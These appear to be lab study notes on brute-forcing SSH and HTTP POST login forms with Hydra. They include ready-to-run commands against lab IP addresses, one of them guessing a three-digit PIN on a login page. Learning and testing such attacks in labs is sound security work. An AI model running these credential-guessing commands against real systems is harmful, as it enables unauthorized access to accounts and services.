### SSH
Brute forcing the ssh with hydra

```
hydra -l <username> -P <full path to pass> 10.10.32.232 -t 4 ssh
```

### Post Web Form

We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser’s network tab (in developer tools) to see the request types or view the source code.

``` 
sudo hydra <username> <wordlist> 10.10.32.232 http-post-form "<path>:<login_credentials>:<invalid_response>"
```
Below is a more concrete example Hydra command to brute force a POST login form:
```bash
hydra -l <username> -P <wordlist> 10.10.32.232 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

```
 hydra -l '' -P 3digits.txt -f -v 10.10.221.183 http-post-form
 "/login.php:pin=^PASS^:Access denied" -s 8000
```